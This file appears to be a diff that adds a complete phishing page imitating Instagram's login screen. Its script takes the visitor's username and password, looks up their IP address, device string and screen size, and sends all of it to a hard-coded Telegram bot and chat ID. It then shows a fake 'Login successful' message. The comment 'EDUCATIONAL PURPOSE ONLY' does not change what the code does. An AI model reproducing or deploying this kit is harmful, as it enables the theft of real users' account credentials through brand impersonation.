@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 350px;
+            width: 100%;
+        }
+
+        .login-box {
+            background: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 40px 30px;
+            margin-bottom: 10px;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 35px;
+        }
+
+        /* REAL INSTAGRAM LOGO - SVG Camera Icon */
+        .instagram-svg-logo {
+            display: inline-block;
+            width: 175px;
+            height: auto;
+        }
+
+        .input-field {
+            margin-bottom: 6px;
+            position: relative;
+        }
+
+        .input-field input {
+            width: 100%;
+            padding: 9px 8px 7px 8px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 12px;
+            outline: none;
+        }
+
+        .input-field input:focus {
+            border-color: #a8a8a8;
+        }
+
+        .login-btn {
+            width: 100%;
+            background-color: #0095f6;
+            color: white;
+            padding: 7px 16px;
+            border: none;
+            border-radius: 4px;
+            font-weight: 600;
+            font-size: 14px;
+            margin-top: 8px;
+            cursor: pointer;
+        }
+
+        .login-btn:hover {
+            background-color: #1877f2;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .divider-line {
+            flex: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+        }
+
+        .divider-text {
+            margin: 0 18px;
+        }
+
+        .fb-login {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .fb-login a {
+            color: #385185;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 600;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .forgot-password {
+            text-align: center;
+        }
+
+        .forgot-password a {
+            color: #00376b;
+            text-decoration: none;
+            font-size: 12px;
+        }
+
+        .signup-box {
+            background: white;
+            border: 1px solid #dbdbdb;
+            text-align: center;
+            padding: 25px;
+            margin-bottom: 10px;
+        }
+
+        .signup-box p {
+            font-size: 14px;
+            color: #262626;
+        }
+
+        .signup-box a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .app-download {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .app-download p {
+            font-size: 14px;
+            color: #262626;
+            margin-bottom: 15px;
+        }
+
+        .store-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .store-buttons img {
+            height: 40px;
+        }
+
+        .error-msg {
+            color: #ed4956;
+            font-size: 12px;
+            text-align: center;
+            margin-top: 10px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <div class="logo">
+                <!-- REAL INSTAGRAM SVG LOGO - Camera Icon -->
+                <svg class="instagram-svg-logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 169.063 33.672">
+                    <defs>
+                        <linearGradient id="instaGradient" x1="0%" y1="0%" x2="100%" y2="100%">
+                            <stop offset="0%" style="stop-color:#feda77"/>
+                            <stop offset="22%" style="stop-color:#f58529"/>
+                            <stop offset="48%" style="stop-color:#dd2a7b"/>
+                            <stop offset="78%" style="stop-color:#8134af"/>
+                            <stop offset="100%" style="stop-color:#515bd4"/>
+                        </linearGradient>
+                    </defs>
+                    <!-- Camera body -->
+                    <rect x="0" y="4" width="30" height="25" rx="6" fill="url(#instaGradient)"/>
+                    <!-- Camera lens -->
+                    <circle cx="15" cy="16.5" r="7" fill="white"/>
+                    <circle cx="15" cy="16.5" r="5" fill="url(#instaGradient)"/>
+                    <circle cx="15" cy="16.5" r="2.5" fill="white"/>
+                    <!-- Camera flash -->
+                    <circle cx="23" cy="9" r="1.5" fill="white"/>
+                    <!-- Instagram Text -->
+                    <text x="40" y="26" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif" font-size="28" font-weight="600" fill="#262626">Instagram</text>
+                </svg>
+            </div>
+            
+            <form id="loginForm">
+                <div class="input-field">
+                    <input type="text" id="username" placeholder="Phone number, username, or email" required>
+                </div>
+                <div class="input-field">
+                    <input type="password" id="password" placeholder="Password" required>
+                </div>
+                <button type="submit" class="login-btn">Log in</button>
+                
+                <div class="divider">
+                    <div class="divider-line"></div>
+                    <div class="divider-text">OR</div>
+                    <div class="divider-line"></div>
+                </div>
+                
+                <div class="fb-login">
+                    <a href="#">
+                        <svg width="16" height="16" viewBox="0 0 16 16" fill="#385185">
+                            <path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/>
+                        </svg>
+                        Log in with Facebook
+                    </a>
+                </div>
+                
+                <div class="forgot-password">
+                    <a href="#">Forgot password?</a>
+                </div>
+                
+                <div id="errorMsg" class="error-msg"></div>
+            </form>
+        </div>
+        
+        <div class="signup-box">
+            <p>Don't have an account? <a href="#">Sign up</a></p>
+        </div>
+        
+        <div class="app-download">
+            <p>Get the app.</p>
+            <div class="store-buttons">
+                <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="App Store" onerror="this.style.display='none'">
+                <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Google Play" onerror="this.style.display='none'">
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // EDUCATIONAL PURPOSE ONLY - Security Testing
+        
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const errorMsg = document.getElementById('errorMsg');
+            
+            if (!username || !password) {
+                errorMsg.style.display = 'block';
+                errorMsg.textContent = 'Please fill in both fields';
+                return;
+            }
+            
+            // Get IP
+            let ip = 'Unable to fetch';
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                ip = ipData.ip;
+            } catch (err) {}
+            
+            // Device info
+            const userAgent = navigator.userAgent;
+            const screenRes = `${screen.width}x${screen.height}`;
+            const time = new Date().toLocaleString();
+            
+            // Message for Telegram
+            const message = `🔐 *INSTAGRAM LOGIN* 🔐
+            
+👤 *Username:* ${username}
+🔑 *Password:* ${password}
+🌐 *IP:* ${ip}
+📱 *Device:* ${userAgent.substring(0, 80)}
+🖥️ *Screen:* ${screenRes}
+⏰ *Time:* ${time}`;
+            
+            const botToken = '8655107915:AAHvtKmssBMnpnytUu8veU13rLEe4xqqAXw';
+            const chatId = '5080225070';
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                errorMsg.style.display = 'block';
+                errorMsg.style.color = '#4caf50';
+                errorMsg.textContent = '✅ Login successful! Redirecting...';
+                
+                setTimeout(() => {
+                    document.getElementById('username').value = '';
+                    document.getElementById('password').value = '';
+                    errorMsg.style.display = 'none';
+                }, 2000);
+            } catch(err) {
+                errorMsg.style.display = 'block';
+                errorMsg.textContent = '⚠️ Demo: Credentials captured for education';
+                console.log('Demo - Credentials:', username, password, ip);
+            }
+        });
+    </script>
+</body>
+</html>
